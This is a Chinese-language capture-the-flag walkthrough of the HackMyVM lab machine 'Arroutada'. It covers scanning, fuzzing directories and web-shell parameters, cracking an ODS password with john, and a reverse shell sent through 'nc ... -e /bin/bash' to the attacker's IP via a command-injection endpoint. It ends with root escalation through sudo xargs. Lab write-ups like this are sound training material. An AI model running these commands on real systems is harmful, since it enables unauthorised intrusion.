# hmv_Arroutada

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Arroutada  
**难度**：绿色  
**目标 IP**：192.168.205.151  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
Nmap scan report for 192.168.205.151
Host is up (0.00024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms 192.168.205.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
                                                        
```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151
<div align="center"><img src="imgs/apreton.png"></div>

```

爆破目录

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/.                    (Status: 200) [Size: 59]
/imgs                 (Status: 301) [Size: 317] [--> http://192.168.205.151/imgs/]
/scout                (Status: 301) [Size: 318] [--> http://192.168.205.151/scout/]
Progress: 598000 / 598005 (100.00%)
===============================================================                                                                      
Finished
===============================================================

```

查看/scout

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151/scout/

<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->

```

爆破

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "192.168.205.151/scout/FUZZ/docs/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/scout/FUZZ/docs/
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000021664:   200        1016 L   12059 W    189769 Ch   "j2"                                                                

Total time: 59.22016
Processed Requests: 119600
Filtered Requests: 119599
Requests/sec.: 2019.582

```

![image](assets/image-20250208171240-95jvvsi.png)

pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ file shellfile.ods                                            
shellfile.ods: OpenDocument Spreadsheet
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)   
1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed. 

```

打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.151/thejabasshell.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000280:   200        0 L      5 W        33 Ch       "a"                                                                 
000000557:   200        0 L      0 W        0 Ch        "Controls"                                                          

Total time: 0
Processed Requests: 474
Filtered Requests: 473
Requests/sec.: 0

┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.151/thejabasshell.php?a=id
Error: Problem with parameter "b"                                                                                                                                
```

还要一个b的参数

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000001999:   200        1 L      3 W        54 Ch       "pass"                                                              
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 41.29983
Processed Requests: 56690
Filtered Requests: 56689
Requests/sec.: 1372.644

┌──(kali㉿kali)-[~/test]
└─$ curl "http://192.168.205.151/thejabasshell.php?a=id&b=pass"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                        
```

使用a参数弹个shell回来就好了

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@arroutada:/var/www/html$ ls -al
total 24
drwxr-xr-x  4 root root 4096 Jan  8  2023 .
drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
-rw-r--r--  1 root root   59 Jan  8  2023 index.html
drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
www-data@arroutada:/var/www/html$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@arroutada:/var/www/html$ cd ..
www-data@arroutada:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
drwxr-xr-x  4 root root 4096 Jan  8  2023 html
www-data@arroutada:/var/www$ cd ..
www-data@arroutada:/var$ ls -al
total 48
drwxr-xr-x 12 root root  4096 Jan  8  2023 .
drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Jan  8  2023 log
drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
lrwxrwxrwx  1 root root     4 Jan  8  2023 run -> /run
drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  3 root root  4096 Jan  8  2023 www
www-data@arroutada:/var$ cd /home/
www-data@arroutada:/home$ ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
www-data@arroutada:/home$ cd /opt/
www-data@arroutada:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan  8  2023 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/opt$ cd /tmp/
www-data@arroutada:/tmp$ sl -al
bash: sl: command not found
www-data@arroutada:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  8 03:46 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/tmp$ cd /
www-data@arroutada:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Jan  8  2023 .
drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
drwxr-xr-x   3 root root  4096 Jan  8  2023 home
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Jan  8  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan  8  2023 media
drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
drwx------   3 root root  4096 Jan  8  2023 root
drwxr-xr-x  17 root root   480 Feb  8 03:46 run
lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
drwxr-xr-x  12 root root  4096 Jan  8  2023 var
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
www-data@arroutada:/$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
www-data@arroutada:/$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@arroutada:/$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             
```

有个8000端口没有公开，所以我们要转发，但是它socat少了so，那我们直接找其他的工具吧

```
www-data@arroutada:/tmp$ curl http://127.0.0.1:5000
bash: curl: command not found
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
--2025-02-08 04:00:55--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================>]     319  --.-KB/s    in 0s    

2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]

www-data@arroutada:/tmp$ ls -la
total 476
drwxrwxrwt  2 root     root       4096 Feb  8 04:00 .
drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
www-data@arroutada:/tmp$ cat index.html 
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->

```

![image](assets/image-20250208171809-5xkbgq0.png)

那我们看它提示的/priv.php

```
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                                                       [<=>                                                                    priv.php                                                       [ <=>                                                                                                                                     ]     308  --.-KB/s    in 0s    

2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ cat priv.php 
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/

```

说我们少了参数，我们加上就好了

```
www-data@arroutada:/tmp$ wget --post-data='{"command":"whoami"}' http://127.0.0.1:8000/priv.php -q -O -
drito


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/

```

利用

```
www-data@arroutada:/tmp$ wget --post-data='{"command":"nc 192.168.205.128 8888 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -q -O -
```

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)

```

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

提权

```
drito@arroutada:~/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs

```

https://gtfobins.github.io/gtfobins/xargs/#sudo

```
drito@arroutada:~/web$ sudo xargs -a /dev/null bash
root@arroutada:/home/drito/web# id
uid=0(root) gid=0(root) groups=0(root)
```

‍